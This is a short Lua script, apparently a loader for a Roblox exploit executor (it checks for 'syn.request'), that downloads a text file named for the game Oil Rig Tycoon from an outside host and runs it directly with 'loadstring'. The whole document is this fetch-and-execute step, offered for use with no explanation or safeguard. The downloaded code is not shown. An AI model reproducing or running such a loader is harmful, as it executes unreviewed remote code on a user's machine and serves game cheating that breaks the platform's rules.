if syn then request = syn.request end
local req = request({
   Url = 'https://files.shade4real.net/oilRigTycoon.txt'
})
loadstring(req.Body)()